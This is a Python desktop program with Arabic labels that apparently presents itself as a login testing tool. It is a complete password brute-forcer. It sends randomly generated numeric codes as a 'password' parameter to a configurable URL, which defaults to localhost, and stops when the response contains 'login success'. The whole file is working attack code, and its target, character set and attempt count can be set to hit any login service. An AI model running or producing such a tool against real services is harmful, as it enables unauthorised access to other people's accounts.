import tkinter as tk
from tkinter import ttk
import threading
import requests
import time
import random

CORRECT_SUCCESS_PHRASE = "login success"   # ما يعرضه api.html عند النجاح

class NetworkBruteForceTool(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("أداة اختبار تسجيل الدخول")
        self.geometry("900x650")
        self.configure(bg='#1a1a1a')

        self.is_running = False
        self.session = requests.Session()

        self.setup_ui()

    def setup_ui(self):
        settings_frame = tk.LabelFrame(self, text="الإعدادات", bg='#2a2a2a', fg='white', font=('Arial', 12, 'bold'))
        settings_frame.pack(fill='x', padx=10, pady=10)

        fields = [
            ("رابط الخدمة:", "service_url", "http://127.0.0.1:5000/api.html"),
            ("البادئة:", "prefix", ""),
            ("الطول الكلي:", "length", "6"),
            ("عدد المحاولات:", "attempts", "500"),
            ("التأخير (ms):", "delay", "200"),
            ("المكونات:", "charset", "0123456789")
        ]

        for idx, (label, name, default) in enumerate(fields):
            frame = tk.Frame(settings_frame, bg='#2a2a2a')
            frame.grid(row=idx, column=0, sticky='ew', pady=3)

            tk.Label(frame, text=label, bg='#2a2a2a', fg='white').pack(side='left')
            entry = tk.Entry(frame, bg='#333', fg='white', insertbackground='white')
            entry.insert(0, default)
            entry.pack(side='left', fill='x', expand=True)

            setattr(self, f"{name}_entry", entry)

        control = tk.Frame(self, bg="#1a1a1a")
        control.pack(pady=10)

        self.start_btn = tk.Button(control, text="▶ بدء", command=self.start_attack,
                                   bg="#28a745", fg="white", font=("Arial", 12), width=15)
        self.start_btn.pack(side="left", padx=5)

        self.stop_btn = tk.Button(control, text="⏹ إيقاف", state="disabled",
                                  command=self.stop_attack, bg="#dc3545", fg="white",
                                  font=("Arial", 12), width=10)
        self.stop_btn.pack(side="left", padx=5)

        results_frame = tk.LabelFrame(self, text="النتائج", bg='#2a2a2a', fg='white')
        results_frame.pack(fill='both', expand=True, padx=10, pady=5)

        self.log_text = tk.Text(results_frame, bg='#111', fg='white', font=('Consolas', 10))
        self.log_text.pack(fill='both', expand=True)

    def log(self, msg):
        self.log_text.insert("end", msg + "\n")
        self.log_text.see("end")
        self.update_idletasks()

    def generate_code(self):
        prefix = self.prefix_entry.get()
        length = int(self.length_entry.get())
        charset = self.charset_entry.get()

        suffix_len = length - len(prefix)
        suffix = ''.join(random.choice(charset) for _ in range(suffix_len))

        return prefix + suffix

    def start_attack(self):
        self.is_running = True
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")

        self.log("🔍 بدء التخمين...")

        threading.Thread(target=self.attack, daemon=True).start()

    def stop_attack(self):
        self.is_running = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.log("⛔ تم الإيقاف.")

    def check_success(self, response):
        if not response:
            return False

        text = response.text.lower()

        if CORRECT_SUCCESS_PHRASE in text:
            return True

        return False

    def attack(self):
        url = self.service_url_entry.get().strip()
        delay = int(self.delay_entry.get()) / 1000
        max_attempts = int(self.attempts_entry.get())

        for _ in range(max_attempts):
            if not self.is_running:
                break

            code = self.generate_code()

            try:
                # إرسال كلمة المرور فقط كما تطلب api.html
                response = self.session.get(url, params={"password": code})

                if self.check_success(response):
                    self.log(f"\n✔✔✔ نجاح! كلمة المرور هي: {code}\n")
                    self.stop_attack()
                    return

                self.log(f"✘ فشل: {code}")

            except Exception as e:
                self.log(f"⚠ خطأ اتصال: {str(e)}")

            time.sleep(delay)

        self.stop_attack()


if __name__ == "__main__":
    app = NetworkBruteForceTool()
    app.mainloop()
